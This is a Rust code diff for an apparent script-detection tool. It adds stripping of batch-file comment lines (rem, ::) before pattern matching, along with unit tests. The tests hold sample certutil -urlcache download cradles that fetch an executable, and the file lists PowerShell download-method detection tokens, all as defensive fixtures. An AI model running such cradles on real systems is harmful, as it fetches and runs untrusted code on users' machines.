@@ -49,18 +49,23 @@ const SCRIPT_DOWNLOAD_COMMAND_TOKENS: &[&str] = &[
 const SCRIPT_DOTTED_DOWNLOAD_METHODS: &[&str] =
     &[".downloadstring(", ".downloadfile(", ".downloaddata("];
 
-/// Strip inline `#` comments from `content` for the languages in
-/// [`HASH_COMMENT_LANGUAGES`], preserving line structure (line count
-/// and column positions of pre-`#` content). The original content is
-/// still passed to detectors that need raw evidence text via the
-/// `original` argument; only the canonical lowercased view used for
-/// pattern matching is normalised here. JS / TS / Node files are left
-/// alone — their comment marker is `//` and would require a different
-/// stripper that doesn't collide with `https://`.
+/// Strip comments from `content` before pattern matching, preserving line
+/// structure (line count). For [`HASH_COMMENT_LANGUAGES`] this drops inline
+/// `#` comments; for batch (`.bat`/`.cmd`) it drops whole-line `rem`/`::`
+/// comments (batch has no inline comment marker). The original content is
+/// still passed to detectors that need raw evidence text via the `original`
+/// argument; only the canonical lowercased view used for pattern matching is
+/// normalised here. JS / TS / Node files are left alone — their comment
+/// marker is `//` and would require a different stripper that doesn't collide
+/// with `https://`.
 pub(super) fn strip_comments_for_detection(content: &str, language: &str) -> String {
-    if !HASH_COMMENT_LANGUAGES.contains(&language) {
+    let strip_line: fn(&str) -> &str = if HASH_COMMENT_LANGUAGES.contains(&language) {
+        strip_inline_hash_comment
+    } else if matches!(language, "bat" | "cmd") {
+        strip_batch_comment
+    } else {
         return content.to_string();
-    }
+    };
     let mut out = String::with_capacity(content.len());
     let mut first = true;
     for line in content.lines() {
@@ -68,12 +73,31 @@ pub(super) fn strip_comments_for_detection(content: &str, language: &str) -> Str
             out.push('\n');
         }
         first = false;
-        out.push_str(strip_inline_hash_comment(line));
+        out.push_str(strip_line(line));
     }
     if content.ends_with('\n') {
         out.push('\n');
     }
     out
+}
+
+/// A batch comment line: a `rem` (optionally `@rem`) command or a `::`
+/// label-comment after leading whitespace. Returns "" for such lines so a
+/// commented-out `rem certutil -urlcache …` does not trip the download /
+/// persistence detectors. Batch has no inline comment marker, so only
+/// whole-line comments are stripped.
+fn strip_batch_comment(line: &str) -> &str {
+    let body = line.trim_start();
+    let body = body.strip_prefix('@').unwrap_or(body);
+    if body.starts_with("::") {
+        return "";
+    }
+    let is_rem = body.get(..3).is_some_and(|h| h.eq_ignore_ascii_case("rem"))
+        && matches!(body.as_bytes().get(3), None | Some(b' ' | b'\t'));
+    if is_rem {
+        return "";
+    }
+    line
 }
 
 pub(crate) fn analyze_script(
@@ -710,6 +734,46 @@ mod tests {
         assert!(
             !relation_target_present(&script_relations(content), "remote-resource"),
             "a bare identifier must not be read as a download call",
+        );
+    }
+
+    /// Contract: batch comment lines (`rem`, `@rem`, `::`) are stripped before
+    /// detection so a commented-out cradle does not fire, while a real command
+    /// line and a `rem`-prefixed identifier (`remote`) are preserved.
+    #[test]
+    fn strip_batch_comment_drops_rem_and_colon_lines() {
+        assert_eq!(
+            strip_batch_comment("rem certutil -urlcache http://x p.exe"),
+            ""
+        );
+        assert_eq!(strip_batch_comment("  @rem disabled persistence"), "");
+        assert_eq!(strip_batch_comment(":: this is a label comment"), "");
+        assert_eq!(
+            strip_batch_comment("certutil -urlcache http://x p.exe"),
+            "certutil -urlcache http://x p.exe"
+        );
+        assert_eq!(
+            strip_batch_comment("remote_host=example.com"),
+            "remote_host=example.com"
+        );
+    }
+
+    /// Contract (end-to-end): the comment-stripping applied to `.bat`/`.cmd`
+    /// content removes a commented-out cradle so it does not register a
+    /// download, but keeps an active one.
+    #[test]
+    fn batch_comment_stripping_gates_download_detection() {
+        let commented =
+            strip_comments_for_detection("rem certutil -urlcache http://x/p.exe p.exe\n", "bat");
+        assert!(
+            !commented.lines().any(line_contains_lolbin_download),
+            "a commented batch cradle must not register a download",
+        );
+        let active =
+            strip_comments_for_detection("certutil -urlcache http://x/p.exe p.exe\n", "cmd");
+        assert!(
+            active.lines().any(line_contains_lolbin_download),
+            "an active batch cradle must register a download",
         );
     }
 
